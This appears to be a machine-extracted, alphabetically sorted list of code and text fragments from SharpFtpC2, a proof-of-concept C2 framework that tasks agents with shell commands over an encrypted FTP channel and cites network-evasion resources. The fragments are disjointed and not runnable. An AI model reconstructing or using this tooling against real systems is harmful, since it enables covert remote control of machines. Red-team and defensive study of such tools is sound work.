@@ -1,0 +1,487 @@
+"(!Agents.TryGetValue(ActiveAgent, out Agent? agent"
+"(!CanProcessFile(packedFileName, SelfEncryptionHelper"
+"(""                                                                                """
+"(""                                 ~?5@?#B!7                                      """
+"(""                                (@DarkCoderSc"
+"(""                                YJP?PJ5YYYY~                                    """
+"(""                               ~ Donnie Darko ~                                 """
+"(""                              7^Y@@@@B&@@@B:?                                   """
+"(""                              ^Y?5#@@@@@&P?Y~                                   """
+"(""                             BP              !P5                                """
+"(""                            G@@@5:G####BB!!#GB@J                                """
+"(""                            J&@@P:P&@@@@B~7@@@G:                                """
+"(""                           :^~~7YYYJ7:775YY?!~^:                                """
+"(""                          !G^^&@@G?7J5Y7?5&@@? 5J                               """
+"(""                          ?BP?@Y              ?@#^                              """
+"(""                          ~ !YYJJP&^G@@^BBJJJYJ ~^                              """
+"(""                         J@Y:G@@@@@@#?G&@@@@@#~!@G:                             """
+"(""                         SharpFtpC2 (PoC"
+"(""                         ~!:&@@@#Y7:75Y:!?B&@@@?:7                              """
+"(""                        :G@!^YYJYJ?7&@@J?YJYJY!:#&~                             """
+"(""                        :YB#P5555J?:5BG^7J5555PB#P~                             """
+"(""                        ?@@J 5@@@@@@@@@@@@@@@B^!&@P                             """
+"(""                        G@@?^#@@@@@@@@@@@@@@@@7^&@@^                            """
+"(""                        J^  7@:            !J  5&                               """
+"(""                        Y@&:!&&&@&#@@@@@&#@&&&Y G@B                             """
+"(""                        ^   ^&7            :PJ^ Y!                              """
+"(""                        ^@&!JB#&&@#:5@#:P@@&#B5!G@?                             """
+"(""                        ^PJ~:BY                #@^                              """
+"(""                      7?    JG^               !@7                               """
+"(""                     https://www.github.com/DarkCoderSc                         """
+"(""                    If the sky were to suddenly open up,                        """
+"(""                    ^?P?                                                        """
+"(""                    ^P5:  ~G5:                ~@Y   ^J~                         """
+"(""                   ?P   :~                       :~~   ~YP##^                   """
+"(""                   ^! :Y^                               ^!~                     """
+"(""                   ^#7   !G!                   ~5Y~  ^PP?!7B~                   """
+"(""                  There would only be you and your memories.                    """
+"(""                there would be no law, there would be no rule.                  """
+"("" """
+"("" "", args.Values"
+"("" ="""
+"("" > """
+"(""#"""
+"(""* """
+"(""-?|-h|--help"""
+"(""-s|--seconds"", ""Seconds to wait"", CommandOptionType.SingleValue"
+"("":"", candidates.Select(b => b.ToString(""x2"""
+"(""= """
+"(""AES-GCM 256 Debug Information:"""
+"(""Answer: """
+"(""Cipher AES Key"", FormatByteArrayAsString(cipherAesKey, 16"
+"(""Ciphertext:"""
+"(""Display Name"""
+"(""Domain"""
+"(""EOF"""
+"(""Encryption / Decryption Tester"""
+"(""File is corrupted or invalid."""
+"(""Generated RSA Key Pair"""
+"(""Id"""
+"(""Is64Bit"""
+"(""Kind"""
+"(""Last Seen"""
+"(""No RSA Private Key Provided."""
+"(""No RSA Public Key Provided."""
+"(""No agent so far."""
+"(""No result so far."""
+"(""Nonce"", FormatByteArrayAsString(Nonce"
+"(""Plain AES Key"", FormatByteArrayAsString(plainAesKey"
+"(""Plaintext:"""
+"(""PrivKey:"""
+"(""Private Key Guid Fingerprint"", encryptionHelper.GetPrivateKeyFingerprint("
+"(""Process Id"""
+"(""PubKey:"""
+"(""Public Key Fingerprint"", ComputeFingerprint(privateKey"
+"(""Public Key Fingerprint"", ComputeFingerprint(publicKey"
+"(""Public Key Guid Fingerprint"", encryptionHelper.GetPublicKeyFingerprint("
+"(""Tag"", FormatByteArrayAsString(Tag"
+"(""Task Action Denied by End-user."""
+"(""Type some text to encrypt (`exit` to terminate the program"
+"(""User@Computer"""
+"(""When"""
+"(""You must specify at least a public key or a private key."""
+"(""] > """
+"(""`"""
+"(""`"", i"
+"(""command"", ""Shell command"", true"
+"(""controller"""
+"(""id"""
+"(""id"", ""Agent Id"""
+"(""id"", ""Task response identifier"""
+"(""plain text > """
+"(""{9A19103F-16F7-4668-BE54-9A1E7A4F7556}"""
+"(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"""
+"(""|"""
+"($""'{arg.Value}' is not a valid GUID."""
+"($""({agent.Domain}"
+"($""@DaemonBeaconThread: {ex.Message}"""
+"($""@DaemonProbeThread: {ex.Message}"""
+"($""@DaemonSynchronizeThread: {ex.Message}"""
+"($""@DaemonTasksThread: {ex.Message}"""
+"($""@{label}"""
+"($""Agent Id(`{agentId}`"
+"($""Agent Id: `{AgentSession}`"""
+"($""Command: `{responseShellCommand.Command}`"""
+"($""Process new task(`{task.Id}`"
+"($""Response Id(`{responseId}`"
+"($""Session GUID expected but not found for file \""{file}\""."""
+"($""Task(`{task.Id}`"
+"($""Task(`{taskId}`"
+"($""[!] Before proceeding (Task: `{nature}`"
+"($""] """
+"($""`{argument.Value("
+"($""`{response.GetType("
+"($""ftp://{this.Host}/{uri ?? """"}"""
+"($""{agent.User}@"""
+"($""{key} : """
+"('=', title.Length + 4"
+"((pair2, pair1"
+"() : base(""404 Not Found"""
+"() : base(""405 Method Not Allowed"""
+"() => Console.WriteLine(""|"" + new string('-', headerLength"
+"() ?? """""
+"().Name}` is unknown."""
+"().Name}`..."""
+"()}\"" successfully processed."""
+"(BeaconDelayMin, BeaconDelayMax"
+"(ConcurrentDictionary<Guid /* Agent */, ResponseWrapper> responses"
+"(ConcurrentDictionary<Guid /* AgentId */, Agent> agents"
+"(CryptoStream cryptoStream = new(cipherStream, encryptor, CryptoStreamMode.Write"
+"(EncodedPublicKey, EncodedPrivateKey"
+"(FtpHost, FtpUser, FtpPwd, FtpSecure"
+"(FtpHost, FtpUser, FtpPwd, FtpSecure, AgentSession"
+"(Guid.TryParse(arg.Value, out Guid agentId"
+"(Guid.TryParse(arg.Value, out Guid responseId"
+"(KeyValuePair<Guid, Agent> agentPair in agentPairs"
+"(KeyValuePair<Guid, ResponseWrapper> entry in TaskResponses"
+"(PackedFileName packedFileName, AsymEncryptionHelper? encryptionHelper"
+"(ResponseWrapper response, Guid taskId"
+"(Stream data, string destFilePath"
+"(TaskCommand.CommandKind command, Guid agentId"
+"(TaskCommand.CommandKind.TerminateAgent, ActiveAgent"
+"(TaskResponses.TryGetValue(responseId, out ResponseWrapper? value"
+"(TaskWrapper taskRequest, Guid agentId"
+"(action.Split("" """
+"(aes.Key, aes.IV"
+"(aes.KeySize, aes.Mode, aes.Key, cipherAesKey, aes.IV"
+"(aes.KeySize, aes.Mode, aesKey, cipherAesKey, aes.IV"
+"(aesKey, cipherAesKey, nonce, authenticatinTag"
+"(aesKey, cipherAesKey, nonce, tag"
+"(agent.Id, agent, (key, oldValue"
+"(byte[] bytes, int? maxLength = null"
+"(byte[] cipherText, byte[] cipherAesKey, byte[] Nonce, byte[] Tag"
+"(byte[] cipherText, byte[] cipherAesKey, byte[] nonce, byte[] authenticatinTag"
+"(byte[] publicKey, byte[] privateKey"
+"(byte[]? publicKey, byte[]? privateKey"
+"(cipherStream, decryptor, CryptoStreamMode.Read"
+"(cipherText, cipherAesKey, Nonce, Tag"
+"(cipherText, cipherAesKey, nonce, tag"
+"(content, destFilePath"
+"(destinationFilePath, FileMode.Create, FileAccess.Write"
+"(encryptedData, RSAEncryptionPadding.OaepSHA256"
+"(fileStream, destFilePath"
+"(host, username, password, secure"
+"(jsonAgent, remoteFileName"
+"(jsonData, remoteFileName"
+"(localFilePath, FileMode.Open, FileAccess.Read"
+"(message, '!', ConsoleColor.Yellow"
+"(message, '*', ConsoleColor.DarkCyan"
+"(message, '+', ConsoleColor.Green"
+"(message, 'x', ConsoleColor.Red"
+"(message.Substring(i, j - i"
+"(message.Substring(lastIndex, i - lastIndex"
+"(nonce, cipherText, authenticatinTag, plainText"
+"(nonce, plainText, cipherText, tag"
+"(object? sender, EventArgs e"
+"(or ""Your"""
+"(packedFileName.Uid.Value, response"
+"(packedFilename, packedFilename.GetType("
+"(plainAesKey, cipherAesKey, Nonce, Tag"
+"(plainText == null || plainText == ""exit"""
+"(plainTextData, RSAEncryptionPadding.OaepSHA256"
+"(privateKey, out _"
+"(publicKey, out _"
+"(publicKey, privateKey"
+"(remoteDirectoryPath, WebRequestMethods.Ftp.DeleteFile"
+"(remoteDirectoryPath, WebRequestMethods.Ftp.MakeDirectory"
+"(response, response.GetType("
+"(response, task.Id"
+"(sender, cancelEventArgs"
+"(stream, destFilePath"
+"(string content, string destFilePath"
+"(string host, string username, string password, bool secure"
+"(string host, string username, string password, bool secure, Guid session"
+"(string key, string value, ConsoleColor color = ConsoleColor.Green"
+"(string localFilePath, string destFilePath"
+"(string message, char icon, ConsoleColor color"
+"(string publicKey, string privateKey"
+"(string remoteDirectoryPath = """""
+"(string remoteDirectoryPath, string command"
+"(string remoteFileName, Guid session, Guid? uid, AsymEncryptionHelper? encryptionHelper"
+"(string remoteFilePath, string destinationFilePath"
+"(string value, string needle = @""\+&"""
+"(string? encodedPublicKey, string? encodedPrivateKey"
+"(task, ActiveAgent"
+"(task, task.GetType("
+"(taskCommand, agentId"
+"(taskShellCommand.Command ?? """""
+"(the ""License"""
+"(this.Username, this.Password"
+"(value, pattern"
+(!DangerousActionConfirmation.Invoke(wrappedTask.TaskType
+(!HasPrivateKey(
+(!HasPublicKey(
+(!cancellationToken.IsCancellationRequested
+(!packedFileName.Session.HasValue
+(!packedFileName.Signature.HasValue
+(!responses.ContainsKey(packedFileName.Uid.Value
+(!token.IsCancellationRequested
+(!uint.TryParse(argument.Value(
+('['
+((
+((ResponseNotification
+((ResponseShellCommand
+() + (columnWidths.Length * 2
+().Select(m => m.Value.Trim(
+().ToArray(
+(1000
+(4096
+(50
+(50%
+(@DarkCoderSc
+(ActiveAgent == Guid.Empty
+(Agent console debug window with dangerous action user-confirmation
+(Agent? agent
+(Agents
+(Agents.ContainsKey(agentId
+(Agents.Count == 0
+(Assets/Images/RSAKeyHelper_1.png
+(Assets/Images/RSAKeyHelper_2.png
+(Assets/Images/agent.png
+(Assets/Images/command.png
+(Assets/Images/main.png
+(Asymetric
+(C2
+(CancellationToken
+(CancellationTokenSource.Token
+(CommandOption argument
+(Convert.FromBase64String(publicKey
+(Convert.FromBase64String(remoteFileName
+(Convert.ToBase64String(privateKey
+(Convert.ToBase64String(publicKey
+(DangerousActionConfirmation != null
+(DataColumn column in table.Columns
+(DataRow row in table.Rows
+(DataTable table
+(DateTime dateTime
+(DateTime.Now - agent.DateTime
+(Donnie Darko
+(EncodedPeerPublicKey
+(Encoding.UTF8.GetBytes(jsonData
+(Encoding.UTF8.GetBytes(plainTextData
+(Encoding.UTF8.GetString(plainTextBuffer
+(Encoding.UTF8.GetString(responseShellCommand.Stderr
+(Encoding.UTF8.GetString(responseShellCommand.Stdout
+(Exception e
+(Exception ex
+(Execute command to active(context
+(ExitProgramExceptions
+(ExtensibilityGlobals
+(File Transfer Protocol
+(FtpSecure
+(FtpWebRequest
+(FtpWebResponse
+(Generic
+(Guid? Id
+(HasPrivateKey(
+(HasPublicKey(
+(Id == null
+(KeyKind keyKind
+(KeyKind.privateKey
+(KeyKind.publicKey
+(List of agents
+(MITM
+(MemoryStream cipherStream = new(
+(MonoDevelop/Xamarin Studio
+(PTVS
+(Path.GetDirectoryName(this.WorkPath
+(PeerEncryptionHelper != null
+(PoC
+(ProjectConfigurationPlatforms
+(RSA + AES
+(Recommended
+(ResponseWrapper response
+(S
+(SelfEncryptionHelper != null
+(SelfEncryptionHelper.DecryptFromJson(content
+(SolutionConfigurationPlatforms
+(SolutionProperties
+(Symetric
+(SynchronizeDelay
+(TODO: Dynamic
+(TaskRequestsLock
+(TaskResponses
+(TaskWrapper task
+(TaskWrapper task in tasks
+(TaskWrapper taskRequest in TaskRequests
+(Thread daemon in daemons
+(VSHistory
+(Xamarin productivity tool
+([0-9]
+([0-9][0-9]
+([^{needle}]+
+(_MainThreadLock
+(_disposed
+(a
+(aesKey
+(agent
+(agent != null && agent.Id == packedFileName.Session
+(agent == null
+(agent.Computer
+(agent.WorkDir
+(an example is provided in the Appendix below
+(answer == null
+(args.Values.Count == 0
+(argument
+(argument.HasValue(
+(argument.Value(
+(argument.ValueName
+(b
+(bool disposing
+(byte[] data
+(byte[] encryptedData
+(byte[] plainText
+(byte[] plainTextData
+(bytes
+(c
+(cipherAesKey
+(cipherStream.ToArray(
+(cipherText
+(column.ColumnName.PadRight(columnWidths[index++] + 1
+(columnName.Length > columnWidths[i]
+(columnWidths.Length - 1
+(contains which files were open etc.
+(content
+(cross platform F# VS Code tools
+(cryptoStream
+(d
+(data
+(dateTime
+(default: 1
+(destFilePath
+(disposing
+(e.Message
+(encodedPrivateKey
+(encodedPublicKey
+(encryptedBundle
+(entry.Key
+(entry.Value.AgentId == ActiveAgent
+(entry.Value.DateTime
+(except as stated in this section
+(false
+(file
+(fileStream
+(hash
+(https://github.com/github/gitignore/pull/1529#issuecomment-104372622
+(https://github.com/github/gitignore/pull/2483#issue-259490424
+(https://hub.docker.com/r/stilliard/pure-ftpd/
+(https://linux.die.net/man/8/pure-ftpd
+(https://unprotect.it
+(https://unprotect.it/category/network-evasion/
+(https://visualstudio.microsoft.com/?WT.mc_id=SEC-MVP-5005282
+(https://www.nuget.org/packages/Microsoft.Extensions.CommandLineUtils?WT.mc_id=SEC-MVP-5005282
+(i
+(i + 1 < message.Length && message[i] == '`' && message[i + 1] != '`'
+(icon
+(ii
+(iii
+(including negligence
+(index == 0
+(int
+(int i = 0; i < message.Length; i++
+(int i = 0; i < table.Columns.Count; i++
+(int i = 0; i < table.Rows.Count; i++
+(int keyLength = 4096
+(int n = 0; n < values.Length; n++
+(jsonData
+(jsonText
+(key
+(key == null
+(keyKind
+(keyLength
+(line
+(maxLength.HasValue
+(maxLength.Value
+(message
+(message.Substring(lastIndex
+(new Random(
+(new Thread((object? obj
+(nonce
+(obj == null
+(one key pair for the agent and one for the C2
+(or bind by name
+(or derived from
+(packedFileName == null
+(packedFileName.Name != Shared.PlaceHolders.AgentInformation
+(packedFileName.Name != Shared.PlaceHolders.ResponseRequest
+(packedFileName.Name != Shared.PlaceHolders.TaskRequest
+(packedFileName.Session != this.Session
+(packedFileName.Version != ProtocolVersion
+(pair2.Value.DateTime
+(parser.GetHelpText(
+(plainText
+(plainTextData
+(privateKey
+(privateKey != null
+(process.WaitForExit(60 * 1000 * 10
+(publicKey
+(publicKey != null
+(publicKey == null && privateKey == null
+(remoteDirectoryPath
+(remoteFilePath
+(requestStream
+(response
+(response != null
+(response.GetResponseStream(
+(responseShellCommand.Stderr?.Length > 0
+(responseShellCommand.Stdout?.Length > 0
+(responses.Count == 0
+(row
+(s
+(sass
+(seconds * 1000
+(serializedClass
+(stdErrorTask.Result
+(stdOutputTask.Result
+(stream
+(string action in Utilities.SplitEx(actions
+(string commandLine
+(string data
+(string file in files
+(string jsonText
+(string label
+(string message
+(string nature
+(string plainTextData
+(string publicKey
+(string remoteDirectoryPath
+(string remoteFileName
+(string remoteFilePath
+(string title
+(string value in values
+(string.IsNullOrEmpty(action
+(string.IsNullOrEmpty(actions
+(string.IsNullOrEmpty(file
+(string? uri
+(string[] args
+(table
+(table.Rows.Count == 0
+(task
+(task != null
+(taskCommand.Command
+(taskRequest
+(this
+(this.Session
+(timeSpan.TotalDays < 30
+(timeSpan.TotalDays < 365
+(timeSpan.TotalHours < 24
+(timeSpan.TotalMinutes < 60
+(timeSpan.TotalSeconds < 60
+(title
+(true
+(unwrappedTask != null
+(usually 12 byte / 96 bits
+(v1.0
+(v1.0 Beta
+(value
+(value.PadRight(columnWidths[index++] + 1
+(values[n].Length > columnWidths[n]
+(which are registered by the controller
+(which is generally very unlikely
+(with potential passwords
+(working project files containing files to include in project
+(wrappedResponse.ResponseType
+(wrappedTask == null || wrappedTask.Id != packedFileName.Uid
+(wrappedTask.TaskType
+(x => responses.Contains(x.Key
+(x => x.Value.DateTime
